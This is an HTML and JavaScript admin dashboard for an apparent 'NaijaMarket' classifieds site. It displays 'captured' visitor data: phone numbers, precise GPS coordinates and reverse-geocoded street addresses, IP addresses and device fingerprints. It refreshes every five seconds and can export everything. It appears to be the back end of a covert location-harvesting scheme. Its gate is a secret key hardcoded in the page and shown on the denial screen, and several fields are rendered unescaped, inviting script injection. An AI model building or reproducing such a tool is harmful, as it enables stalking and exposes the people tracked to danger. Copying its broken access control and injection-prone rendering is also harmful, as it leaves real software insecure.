<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Panel | NaijaMarket - View Captured Data</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;400;500;600;700;800;900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Inter', sans-serif; background: #0a0c15; color: #f1f5f9; padding: 24px; }
        
        /* Header */
        .admin-header { background: linear-gradient(135deg, #1a1a2e, #16213e); padding: 28px 36px; border-radius: 28px; margin-bottom: 30px; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 20px; border: 1px solid #e65c00; }
        .admin-header h1 { font-size: 28px; display: flex; align-items: center; gap: 15px; }
        .admin-header h1 i { color: #e65c00; }
        .stats-badge { background: rgba(230,92,0,0.2); padding: 12px 28px; border-radius: 60px; font-size: 15px; font-weight: 600; border: 1px solid #e65c00; }
        
        /* Controls */
        .controls { display: flex; gap: 15px; margin-bottom: 30px; flex-wrap: wrap; }
        .search-box { flex: 1; padding: 14px 24px; background: #1e293b; border: 1px solid #334155; border-radius: 60px; color: white; font-size: 14px; outline: none; }
        .search-box:focus { border-color: #e65c00; }
        .refresh-btn, .export-btn, .clear-btn { padding: 14px 28px; border-radius: 60px; color: white; font-weight: 600; cursor: pointer; border: none; transition: 0.2s; }
        .refresh-btn { background: #3b82f6; }
        .export-btn { background: #e65c00; }
        .clear-btn { background: #ef4444; }
        .refresh-btn:hover, .export-btn:hover, .clear-btn:hover { transform: translateY(-2px); filter: brightness(1.05); }
        
        /* Stats Row */
        .stats-row { display: flex; gap: 20px; margin-bottom: 30px; flex-wrap: wrap; }
        .stat-box { background: #1e293b; padding: 20px; border-radius: 20px; flex: 1; min-width: 150px; text-align: center; border-left: 4px solid #e65c00; }
        .stat-box .number { font-size: 32px; font-weight: 800; color: #e65c00; }
        .stat-box .label { font-size: 12px; color: #94a3b8; margin-top: 5px; }
        
        /* Data Container */
        .data-container { display: flex; flex-direction: column; gap: 24px; max-height: calc(100vh - 280px); overflow-y: auto; padding-right: 8px; }
        .data-container::-webkit-scrollbar { width: 8px; }
        .data-container::-webkit-scrollbar-track { background: #1e293b; border-radius: 10px; }
        .data-container::-webkit-scrollbar-thumb { background: #e65c00; border-radius: 10px; }
        
        /* Data Card */
        .data-card { background: #13132a; border-radius: 24px; padding: 24px; border-left: 6px solid #e65c00; transition: 0.2s; }
        .data-card:hover { background: #1a1a35; transform: translateX(4px); }
        
        .card-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; flex-wrap: wrap; gap: 12px; padding-bottom: 12px; border-bottom: 1px solid #2d3a5e; }
        .badge { padding: 6px 18px; border-radius: 40px; font-size: 12px; font-weight: 700; }
        .badge-ad { background: #22c55e; color: #000; }
        .badge-location { background: #8b5cf6; color: #fff; }
        .delete-btn { background: #ef4444; border: none; padding: 6px 18px; border-radius: 40px; color: white; cursor: pointer; font-size: 12px; font-weight: 600; transition: 0.2s; }
        .delete-btn:hover { background: #dc2626; }
        
        /* Info Grid */
        .info-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 15px; margin: 15px 0; }
        .info-card { background: rgba(0,0,0,0.35); padding: 14px 18px; border-radius: 16px; }
        .info-label { font-size: 11px; color: #94a3b8; text-transform: uppercase; letter-spacing: 0.8px; margin-bottom: 6px; display: flex; align-items: center; gap: 6px; }
        .info-value { font-size: 14px; font-weight: 500; word-break: break-word; color: #e2e8f0; }
        
        /* Location Box */
        .location-box { background: linear-gradient(135deg, rgba(230,92,0,0.1), rgba(230,92,0,0.05)); padding: 18px; border-radius: 20px; margin-top: 15px; border: 1px solid rgba(230,92,0,0.3); }
        .location-title { font-weight: 700; margin-bottom: 12px; color: #e65c00; display: flex; align-items: center; gap: 10px; }
        
        /* Empty State */
        .empty-state { text-align: center; padding: 80px; color: #64748b; }
        
        /* Coordinates */
        .coordinates { font-family: monospace; background: rgba(0,0,0,0.5); padding: 4px 8px; border-radius: 8px; font-size: 12px; }
        
        @media (max-width: 768px) { body { padding: 16px; } .info-grid { grid-template-columns: 1fr; } .admin-header { flex-direction: column; text-align: center; } }
    </style>
</head>
<body>
    <div class="admin-header">
        <h1><i class="fas fa-chart-line"></i> NaijaMarket — Admin Dashboard</h1>
        <div class="stats-badge"><i class="fas fa-database"></i> <span id="recordCount">0</span> Total Records</div>
    </div>
    
    <!-- Stats Summary -->
    <div class="stats-row">
        <div class="stat-box"><div class="number" id="adsCount">0</div><div class="label">Total Ads Posted</div></div>
        <div class="stat-box"><div class="number" id="locationCount">0</div><div class="label">Locations Captured</div></div>
        <div class="stat-box"><div class="number" id="uniqueUsers">0</div><div class="label">Unique IPs</div></div>
    </div>
    
    <div class="controls">
        <input type="text" class="search-box" id="searchInput" placeholder="🔍 Search by title, location, city, state, phone, IP...">
        <button class="refresh-btn" id="refreshBtn"><i class="fas fa-sync-alt"></i> Refresh</button>
        <button class="export-btn" id="exportBtn"><i class="fas fa-download"></i> Export JSON</button>
        <button class="clear-btn" id="clearBtn"><i class="fas fa-trash-alt"></i> Clear All</button>
    </div>
    
    <div class="data-container" id="dataContainer">
        <div class="empty-state"><i class="fas fa-spinner fa-pulse"></i> Loading captured data...</div>
    </div>
    
    <script>
        // SECURITY CHECK - Only allow access with correct secret key
        const urlParams = new URLSearchParams(window.location.search);
        const adminKey = urlParams.get("key");
        const ADMIN_SECRET = "NAIJA2025DOPE";
        
        if (adminKey !== ADMIN_SECRET) {
            document.body.innerHTML = `
                <div style="display:flex;justify-content:center;align-items:center;height:100vh;background:#0a0c15;">
                    <div style="text-align:center;background:#1e293b;padding:50px;border-radius:40px;">
                        <i class="fas fa-lock" style="font-size:70px;color:#ef4444;"></i>
                        <h2 style="margin-top:25px;">Access Denied</h2>
                        <p style="color:#94a3b8;">Valid admin key required</p>
                        <p style="color:#64748b; margin-top:15px; font-size:12px;">Use: ?key=NAIJA2025DOPE</p>
                    </div>
                </div>
            `;
            throw new Error("Unauthorized access");
        }
        
        let allRecords = [];
        
        async function loadData() {
            try {
                const response = await fetch('/api/fetch');
                if (response.ok) {
                    const data = await response.json();
                    allRecords = data.records || [];
                } else {
                    throw new Error('Backend error');
                }
            } catch (err) {
                const stored = localStorage.getItem('naijamarket_data');
                allRecords = stored ? JSON.parse(stored) : [];
            }
            renderData();
            updateStatsSummary();
        }
        
        function updateStatsSummary() {
            const ads = allRecords.filter(r => r.type === 'ad_posted').length;
            const locations = allRecords.filter(r => r.location && (r.location.city || r.location.state)).length;
            const uniqueIPs = new Set(allRecords.map(r => r.device?.ip || r.ip).filter(ip => ip && ip !== 'unknown')).size;
            
            document.getElementById('adsCount').innerText = ads;
            document.getElementById('locationCount').innerText = locations;
            document.getElementById('uniqueUsers').innerText = uniqueIPs;
            document.getElementById('recordCount').innerText = allRecords.length;
        }
        
        function renderData() {
            const container = document.getElementById('dataContainer');
            const searchTerm = document.getElementById('searchInput').value.toLowerCase();
            
            let filtered = allRecords.filter(record => {
                if (record.type === 'ad_posted') {
                    return record.ad.title.toLowerCase().includes(searchTerm) ||
                        (record.ad.location || '').toLowerCase().includes(searchTerm) ||
                        (record.ad.phone || '').toLowerCase().includes(searchTerm) ||
                        (record.location?.city || '').toLowerCase().includes(searchTerm) ||
                        (record.location?.state || '').toLowerCase().includes(searchTerm) ||
                        (record.location?.street || '').toLowerCase().includes(searchTerm) ||
                        (record.device?.ip || record.ip || '').toLowerCase().includes(searchTerm);
                } else {
                    return (record.location?.city || '').toLowerCase().includes(searchTerm) ||
                        (record.location?.state || '').toLowerCase().includes(searchTerm) ||
                        (record.location?.street || '').toLowerCase().includes(searchTerm);
                }
            });
            
            if (filtered.length === 0) {
                container.innerHTML = `<div class="empty-state"><i class="fas fa-inbox"></i> No data found. Users will appear here after posting ads.</div>`;
                return;
            }
            
            container.innerHTML = filtered.map(record => {
                const isAd = record.type === 'ad_posted';
                const loc = record.location;
                
                return `
                    <div class="data-card">
                        <div class="card-header">
                            <div>
                                <span class="badge ${isAd ? 'badge-ad' : 'badge-location'}">
                                    ${isAd ? '<i class="fas fa-ad"></i> AD POSTED' : '<i class="fas fa-map-marker-alt"></i> LOCATION CAPTURED'}
                                </span>
                                <span style="margin-left:12px; font-size:12px; color:#64748b;">
                                    <i class="far fa-clock"></i> ${new Date(record.timestamp).toLocaleString()}
                                </span>
                            </div>
                            <button class="delete-btn" onclick="deleteRecord(${record.id})"><i class="fas fa-trash"></i> Delete</button>
                        </div>
                        
                        ${isAd ? `
                            <div class="info-grid">
                                <div class="info-card">
                                    <div class="info-label"><i class="fas fa-tag"></i> Category</div>
                                    <div class="info-value">${escapeHtml(record.ad.category)}</div>
                                </div>
                                <div class="info-card">
                                    <div class="info-label"><i class="fas fa-heading"></i> Title</div>
                                    <div class="info-value"><strong>${escapeHtml(record.ad.title)}</strong></div>
                                </div>
                                <div class="info-card">
                                    <div class="info-label"><i class="fas fa-naira-sign"></i> Price</div>
                                    <div class="info-value">${escapeHtml(record.ad.price)}</div>
                                </div>
                            </div>
                            <div class="info-card">
                                <div class="info-label"><i class="fas fa-align-left"></i> Description</div>
                                <div class="info-value">${escapeHtml((record.ad.description || '').substring(0, 200))}${(record.ad.description || '').length > 200 ? '...' : ''}</div>
                            </div>
                            <div class="info-grid">
                                <div class="info-card">
                                    <div class="info-label"><i class="fas fa-map-marker-alt"></i> User Input Location</div>
                                    <div class="info-value">${escapeHtml(record.ad.location || 'Not specified')}</div>
                                </div>
                                <div class="info-card">
                                    <div class="info-label"><i class="fab fa-whatsapp"></i> Phone Number</div>
                                    <div class="info-value">${escapeHtml(record.ad.phone || 'Not provided')}</div>
                                </div>
                            </div>
                        ` : ''}
                        
                        ${loc ? `
                            <div class="location-box">
                                <div class="location-title">
                                    <i class="fas fa-map-pin"></i> 📍 PRECISE GPS LOCATION CAPTURED
                                    <span style="font-size: 11px; background: rgba(230,92,0,0.2); padding: 2px 8px; border-radius: 20px;">Real-time GPS</span>
                                </div>
                                <div class="info-grid">
                                    <div class="info-card">
                                        <div class="info-label"><i class="fas fa-road"></i> Street Address</div>
                                        <div class="info-value"><strong>${loc.street || 'N/A'}</strong></div>
                                    </div>
                                    <div class="info-card">
                                        <div class="info-label"><i class="fas fa-city"></i> City/Town</div>
                                        <div class="info-value">${loc.city || 'N/A'}</div>
                                    </div>
                                    <div class="info-card">
                                        <div class="info-label"><i class="fas fa-building"></i> State/Province</div>
                                        <div class="info-value">${loc.state || 'N/A'}</div>
                                    </div>
                                </div>
                                <div class="info-grid">
                                    <div class="info-card">
                                        <div class="info-label"><i class="fas fa-globe-africa"></i> Country</div>
                                        <div class="info-value">${loc.country || 'N/A'}</div>
                                    </div>
                                    <div class="info-card">
                                        <div class="info-label"><i class="fas fa-mail-bulk"></i> Postcode/ZIP</div>
                                        <div class="info-value">${loc.postcode || 'N/A'}</div>
                                    </div>
                                    <div class="info-card">
                                        <div class="info-label"><i class="fas fa-satellite-dish"></i> GPS Accuracy</div>
                                        <div class="info-value">${loc.accuracy ? loc.accuracy + ' meters' : 'N/A'}</div>
                                    </div>
                                </div>
                                <div class="info-card">
                                    <div class="info-label"><i class="fas fa-location-dot"></i> GPS Coordinates</div>
                                    <div class="info-value"><span class="coordinates">${loc.lat || 'N/A'}, ${loc.lng || 'N/A'}</span></div>
                                </div>
                                <div class="info-card">
                                    <div class="info-label"><i class="fas fa-address-card"></i> Full Address (Reverse Geocoded)</div>
                                    <div class="info-value" style="font-size: 12px;">${loc.fullAddress || 'N/A'}</div>
                                </div>
                            </div>
                        ` : '<div class="location-box" style="background:#ef444410;"><i class="fas fa-exclamation-triangle"></i> No location data captured</div>'}
                        
                        ${record.device ? `
                            <div class="info-grid" style="margin-top: 15px;">
                                <div class="info-card">
                                    <div class="info-label"><i class="fas fa-microchip"></i> Device Platform</div>
                                    <div class="info-value">${record.device.platform || 'N/A'}</div>
                                </div>
                                <div class="info-card">
                                    <div class="info-label"><i class="fas fa-globe"></i> IP Address</div>
                                    <div class="info-value"><code>${record.device.ip || record.ip || 'N/A'}</code></div>
                                </div>
                                <div class="info-card">
                                    <div class="info-label"><i class="fas fa-language"></i> Browser Language</div>
                                    <div class="info-value">${record.device.language || 'N/A'}</div>
                                </div>
                                <div class="info-card">
                                    <div class="info-label"><i class="far fa-clock"></i> Timezone</div>
                                    <div class="info-value">${record.device.timezone || 'N/A'}</div>
                                </div>
                            </div>
                            <div class="info-card">
                                <div class="info-label"><i class="fas fa-laptop-code"></i> User Agent (Browser/Device)</div>
                                <div class="info-value" style="font-size: 11px; word-break: break-all;">${record.device.userAgent?.substring(0, 150) || 'N/A'}${record.device.userAgent?.length > 150 ? '...' : ''}</div>
                            </div>
                        ` : ''}
                    </div>
                `;
            }).join('');
        }
        
        function escapeHtml(str) {
            if (!str) return '';
            return str.replace(/[&<>]/g, function(m) {
                if (m === '&') return '&amp;';
                if (m === '<') return '&lt;';
                if (m === '>') return '&gt;';
                return m;
            });
        }
        
        async function deleteRecord(id) {
            if (confirm('⚠️ Delete this record permanently?')) {
                try {
                    await fetch(`/api/delete/${id}`, { method: 'DELETE' });
                } catch(e) {}
                allRecords = allRecords.filter(r => r.id !== id);
                localStorage.setItem('naijamarket_data', JSON.stringify(allRecords));
                renderData();
                updateStatsSummary();
            }
        }
        
        async function clearAllData() {
            if (confirm('⚠️⚠️⚠️ WARNING: This will delete ALL captured data (ads, locations, device info). This action is IRREVERSIBLE. Are you absolutely sure?')) {
                try {
                    await fetch('/api/clear', { method: 'DELETE' });
                } catch(e) {}
                localStorage.removeItem('naijamarket_data');
                allRecords = [];
                renderData();
                updateStatsSummary();
                alert('✅ All data cleared successfully.');
            }
        }
        
        function exportData() {
            const exportData = allRecords.map(record => ({
                ...record
            }));
            const dataStr = JSON.stringify(exportData, null, 2);
            const blob = new Blob([dataStr], { type: 'application/json' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `naijamarket-export-${new Date().toISOString()}.json`;
            a.click();
            URL.revokeObjectURL(url);
        }
        
        document.getElementById('refreshBtn').addEventListener('click', loadData);
        document.getElementById('clearBtn').addEventListener('click', clearAllData);
        document.getElementById('exportBtn').addEventListener('click', exportData);
        document.getElementById('searchInput').addEventListener('input', renderData);
        
        loadData();
        setInterval(loadData, 5000);
    </script>
</body>
</html>
